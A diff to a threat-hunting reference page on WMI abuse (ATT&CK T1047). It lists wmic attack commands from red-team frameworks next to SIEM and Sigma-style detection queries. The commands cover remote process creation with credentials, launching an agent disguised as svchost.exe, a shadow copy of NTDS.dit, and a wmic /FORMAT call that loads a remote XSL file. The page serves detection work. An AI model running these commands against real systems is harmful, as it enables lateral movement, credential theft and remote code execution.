@@ -29,29 +29,21 @@ An adversary can use WMI to interact with local and remote systems and use it as
 ## Potential Commands
 
 ```
-wmic useraccount get /ALL /format:csv
-
-wmic process get caption,executablepath,commandline /format:csv
-
-wmic qfe get description,installedOn /format:csv
-
-wmic /node:"127.0.0.1" service where (caption like "%#{service_search_string}%")
-
-wmic /node:"#{node}" service where (caption like "%Spooler%")
-
-wmic process call create notepad.exe
-
-wmic /user:#{user_name} /password:#{password} /node:"127.0.0.1" process call create #{process_to_execute}
-
-wmic /user:DOMAIN\Administrator /password:#{password} /node:"#{node}" process call create #{process_to_execute}
-
 wmic /user:#{user_name} /password:P@ssw0rd1 /node:"#{node}" process call create #{process_to_execute}
-
+wmic /node:"#{node}" service where (caption like "%Spooler%")
+wmic process call create notepad.exe
+wmic /user:#{user_name} /password:#{password} /node:"127.0.0.1" process call create #{process_to_execute}
+wmic process get caption,executablepath,commandline /format:csv
+wmic /node:"127.0.0.1" service where (caption like "%#{service_search_string}%")
+wmic useraccount get /ALL /format:csv
+wmic /user:DOMAIN\Administrator /password:#{password} /node:"#{node}" process call create #{process_to_execute}
+wmic qfe get description,installedOn /format:csv
 wmic /user:#{user_name} /password:#{password} /node:"#{node}" process call create notepad.exe
-
-{'windows': {'psh': {'command': 'wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n'}}}
-{'windows': {'psh': {'command': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh";\n', 'cleanup': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where "ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" call terminate;\n'}, 'cmd': {'command': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd";\n', 'cleanup': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where "ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" call terminate;\n'}}}
-{'windows': {'psh': {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}";\n', 'cleanup': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "taskkill /f /im s4ndc4t.exe"\n'}}}
+wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;
+cat $env:APPDATA\vmtools.log
+wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "cmd.exe /c C:\Users\Public\svchost.exe -server #{server} -executors cmd";
+wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\Users\Public\svchost.exe -server #{server} -executors psh";
+wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "powershell.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}";
 wmic.exe /NODE:*process call create*
 wmic.exe /NODE:*path AntiVirusProduct get*
 wmic.exe /NODE:*path FirewallProduct get*
@@ -60,9 +52,23 @@ wmic.exe /NODE: "192.168.0.1" process call create "*.exe"
 wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM <path> ^> <path>"
 wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
 powershell/lateral_movement/invoke_wmi
-powershell/lateral_movement/invoke_wmi
 powershell/persistence/elevated/wmi
-powershell/persistence/elevated/wmi
+Log
+#sysmon log
+EventID: 1
+Image: C: \ Windows \ System32 \ wbem \ WMIC.exe
+FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+Description: WMI Commandline Utility
+Product: Microsoft Windows Operating System
+Company: Microsoft Corporation
+OriginalFileName: wmic.exe
+CommandLine: wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl "
+
+# Win7 security log
+EventID: 4688
+Process information:
+New Process ID: 0x888
+New Process name: 'C: \ Windows \ System32 \ wbem \ WMIC.exe'
 ```
 
 ## Commands Dataset
@@ -104,58 +110,28 @@ powershell/persistence/elevated/wmi
              'process call create notepad.exe\n',
   'name': None,
   'source': 'atomics/T1047/T1047.yaml'},
- {'command': {'windows': {'psh': {'command': 'wmic process get '
-                                             'executablepath,name,processid,parentprocessid '
-                                             '>> $env:APPDATA\\vmtools.log;\n'
-                                             'cat '
-                                             '$env:APPDATA\\vmtools.log\n'}}},
+ {'command': 'wmic process get executablepath,name,processid,parentprocessid '
+             '>> $env:APPDATA\\vmtools.log;\n'
+             'cat $env:APPDATA\\vmtools.log\n',
   'name': 'Capture process id, executable path, pid and parent pid before '
           'writing to disk',
   'source': 'data/abilities/collection/94f21386-9547-43c4-99df-938ab05d45ce.yml'},
- {'command': {'windows': {'cmd': {'cleanup': 'wmic /node:#{remote.host.ip} '
-                                             '/user:#{domain.user.name} '
-                                             '/password:#{domain.user.password} '
-                                             'process where '
-                                             '"ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" '
-                                             'call terminate;\n',
-                                  'command': 'wmic /node:#{remote.host.ip} '
-                                             '/user:#{domain.user.name} '
-                                             '/password:#{domain.user.password} '
-                                             'process call create "cmd.exe /c '
-                                             'C:\\Users\\Public\\svchost.exe '
-                                             '-server #{server} -executors '
-                                             'cmd";\n'},
-                          'psh': {'cleanup': 'wmic /node:#{remote.host.ip} '
-                                             '/user:#{domain.user.name} '
-                                             '/password:#{domain.user.password} '
-                                             'process where '
-                                             '"ExecutablePath=\'C:\\\\Users\\\\Public\\\\svchost.exe\'" '
-                                             'call terminate;\n',
-                                  'command': 'wmic /node:#{remote.host.ip} '
-                                             '/user:#{domain.user.name} '
-                                             '/password:#{domain.user.password} '
-                                             'process call create '
-                                             '"powershell.exe '
-                                             'C:\\Users\\Public\\svchost.exe '
-                                             '-server #{server} -executors '
-                                             'psh";\n'}}},
+ {'command': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} '
+             '/password:#{domain.user.password} process call create '
+             '"powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} '
+             '-executors psh";\n',
   'name': 'Remotely executes 54ndc47 over WMI',
   'source': 'data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml'},
- {'command': {'windows': {'psh': {'cleanup': 'wmic '
-                                             '/node:`"#{remote.host.fqdn}`" '
-                                             '/user:`"#{domain.user.name}`" '
-                                             '/password:`"#{domain.user.password}`" '
-                                             'process call create "taskkill /f '
-                                             '/im s4ndc4t.exe"\n',
-                                  'command': 'wmic '
-                                             '/node:`"#{remote.host.fqdn}`" '
-                                             '/user:`"#{domain.user.name}`" '
-                                             '/password:`"#{domain.user.password}`" '
-                                             'process call create '
-                                             '"powershell.exe '
-                                             'C:\\Users\\Public\\s4ndc4t.exe '
-                                             '-server #{server} -group '
-                                             '#{group}";\n'}}},
+ {'command': 'wmic /node:#{remote.host.ip} /user:#{domain.user.name} '
+             '/password:#{domain.user.password} process call create "cmd.exe '
+             '/c C:\\Users\\Public\\svchost.exe -server #{server} -executors '
+             'cmd";\n',
+  'name': 'Remotely executes 54ndc47 over WMI',
+  'source': 'data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml'},
+ {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" '
+             '/password:`"#{domain.user.password}`" process call create '
+             '"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} '
+             '-group #{group}";\n',
   'name': 'Remotely executes 54ndc47 over WMI',
   'source': 'data/abilities/execution/ece5dde3-d370-4c20-b213-a1f424aa8d03.yml'},
  {'command': 'wmic.exe /NODE:*process call create*',
@@ -193,7 +169,27 @@ powershell/persistence/elevated/wmi
   'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
  {'command': 'powershell/persistence/elevated/wmi',
   'name': 'Empire Module Command',
-  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
+  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
+ {'command': 'Log\n'
+             '#sysmon log\n'
+             'EventID: 1\n'
+             'Image: C: \\ Windows \\ System32 \\ wbem \\ WMIC.exe\n'
+             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
+             'Description: WMI Commandline Utility\n'
+             'Product: Microsoft Windows Operating System\n'
+             'Company: Microsoft Corporation\n'
+             'OriginalFileName: wmic.exe\n'
+             'CommandLine: wmic os get '
+             '/FORMAT:"http://192.168.126.146:9996/6G69i.xsl "\n'
+             '\n'
+             '# Win7 security log\n'
+             'EventID: 4688\n'
+             'Process information:\n'
+             'New Process ID: 0x888\n'
+             "New Process name: 'C: \\ Windows \\ System32 \\ wbem \\ "
+             "WMIC.exe'",
+  'name': 'Log',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
 ```
 
 ## Potential Detections
@@ -352,7 +348,28 @@ powershell/persistence/elevated/wmi
   'product': 'Azure Sentinel',
   'query': 'Sysmon| where EventID == 1 and (process_parent_command_line '
            'contains "wmiprvse.exe"or process_path contains "wmic.exe"or '
-           'process_command_line contains "wmic")'}]
+           'process_command_line contains "wmic")'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: Create a remote process by wmic\n'
+           'description: windows server 2016\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           'product: windows\n'
+           'service: system\n'
+           'detection:\n'
+           'selection:\n'
+           'EventID: 4688 # Process Creation\n'
+           "Newprocessname: 'C: \\ Windows \\ System32 \\ wbem \\ WMIC.exe' # "
+           'new process name\n'
+           "        Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' "
+           '# creator process name\n'
+           "        Processcommandline: 'wmic.exe / node: * process *' # "
+           'command-line process\n'
+           'condition: selection\n'
+           'level: medium'}]
 ```
 
 ## Raw Dataset
